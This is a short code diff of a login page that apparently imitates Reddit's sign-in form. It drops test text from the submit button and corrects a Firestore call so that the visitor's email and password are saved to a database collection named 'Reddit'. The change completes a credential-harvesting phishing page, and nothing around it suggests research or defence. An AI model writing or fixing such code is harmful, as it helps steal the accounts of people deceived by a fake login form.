@@ -152,7 +152,7 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in 123</button>
+                <button  type="submit" onclick="datos()">Log in</button>
               </fieldset>
 
 
@@ -284,7 +284,7 @@
       password: passvalue
     });*/
 
-    db.collection('Reddit').document.set({
+    db.collection('Reddit').set({
       email: emailvalue,
       password: passvalue
     })
